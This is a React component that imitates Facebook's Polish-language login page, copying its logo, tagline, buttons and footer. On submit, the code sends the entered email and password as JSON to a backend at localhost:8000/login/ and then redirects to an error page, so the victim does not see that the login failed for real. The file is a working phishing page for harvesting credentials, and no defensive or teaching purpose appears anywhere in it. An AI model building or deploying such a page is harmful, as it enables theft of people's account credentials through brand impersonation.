import React from 'react';
import { useNavigate } from "react-router-dom";

const FacebookPage = () => {
    const navigate = useNavigate();

    const handleSubmit = async (e) => {
        e.preventDefault();

        const email = e.target[0].value;
        const password = e.target[1].value;

        try {
            const response = await fetch("http://localhost:8000/login/", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ email, password })
            });

            if (response.ok) {
            navigate("/error_page");
            } else {
            alert("Wystąpił błąd połączenia z serwerem.");
            }
        } catch (error) {
            console.error("Error submitting credentials:", error);
        }
    };

    return (
        <div className="flex flex-col min-h-screen bg-[#f0f2f5] font-sans">
            {/* Main Content */}
            <div className="flex-grow flex items-center justify-center px-[120px] gap-[80px]">
                {/* Left Panel */}
                <div className="w-[500px]">
                    <h1 className="text-[#1877f2] text-[56px] font-bold leading-none mb-3">facebook</h1>
                    <p className="text-[28px] text-black leading-tight">
                        Facebook pomaga kontaktować się z innymi osobami oraz udostępniać im różne informacje i materiały.
                    </p>
                </div>

                {/* Right Login Panel */}
                <div className="w-[396px]">
                    <div className="bg-white p-4 rounded-lg shadow-[0_2px_4px_rgba(0,0,0,0.1)] border border-gray-200">
                        <form onSubmit={handleSubmit} className="flex flex-col space-y-3">
                            <input
                                type="text"
                                placeholder="Adres e-mail lub numer telefonu"
                                className="border border-gray-300 rounded-md px-4 py-3 text-[17px] focus:outline-none focus:ring-1 focus:ring-blue-500"
                                required
                            />
                            <input
                                type="password"
                                placeholder="Hasło"
                                className="border border-gray-300 rounded-md px-4 py-3 text-[17px] focus:outline-none focus:ring-1 focus:ring-blue-500"
                                required
                            />
                            <button
                                type="submit"
                                className="bg-[#1877f2] text-white text-[20px] font-bold py-2 rounded-md hover:bg-blue-700 transition"
                            >
                                Zaloguj się
                            </button>
                            <p className="text-center text-[#1877f2] text-sm hover:underline cursor-pointer">
                                Nie pamiętasz hasła?
                            </p>
                            <hr />
                            <button
                                type="button"
                                className="bg-[#42b72a] text-white font-bold py-3 rounded-md text-base hover:bg-green-600 transition"
                            >
                                Utwórz nowe konto
                            </button>
                        </form>
                    </div>
                    <p className="mt-6 text-center text-sm text-black">
                        <strong className="hover:underline cursor-pointer">Utwórz stronę</strong> dla gwiazdy, zespołu lub firmy.
                    </p>
                </div>
            </div>

            {/* Footer */}
            <div className="bg-white pt-10 text-xs text-gray-500 text-center space-y-2">
                <div className="flex flex-wrap justify-center gap-x-4 gap-y-1 max-w-5xl mx-auto">
                    <span>Polski</span>
                    <span>English (US)</span>
                    <span>Ślōnskŏ gŏdka</span>
                    <span>Русский</span>
                    <span>Deutsch</span>
                    <span>Français (France)</span>
                    <span>Italiano</span>
                    <span>Українська</span>
                    <span>Español (España)</span>
                    <span>Português (Brasil)</span>
                    <span>العربية</span>
                    <span className="px-2 border rounded-sm cursor-pointer">+</span>
                </div>

                <hr className="my-2 border-gray-300 max-w-5xl mx-auto" />

                <div className="flex flex-wrap justify-center gap-x-4 gap-y-1 max-w-5xl mx-auto">
                    <span>Zarejestruj się</span>
                    <span>Zaloguj się</span>
                    <span>Messenger</span>
                    <span>Facebook Lite</span>
                    <span>Film</span>
                    <span>Meta Pay</span>
                    <span>Sklep Meta</span>
                    <span>Meta Quest</span>
                    <span>Ray-Ban Meta</span>
                    <span>Meta AI</span>
                    <span>Instagram</span>
                    <span>Threads</span>
                    <span>Centrum informacji o głosowaniu</span>
                    <span>Zasady ochrony prywatności</span>
                    <span>Centrum ochrony prywatności</span>
                    <span>Ustawienia plików cookie</span>
                    <span>Informacje</span>
                    <span>Utwórz reklamę</span>
                    <span>Utwórz stronę</span>
                    <span>Twórcy aplikacji</span>
                    <span>Praca</span>
                    <span>Pliki cookie</span>
                    <span>Opcje wyświetlania reklam</span>
                    <span>Regulamin</span>
                    <span>Pomoс</span>
                    <span>Przesyłanie listy kontaktów i osób niebędących użytkownikami</span>
                </div>

                <p className="pt-4 pb-10 mr-190">Meta © 2025</p>
            </div>
        </div>
    );
};

export default FacebookPage;
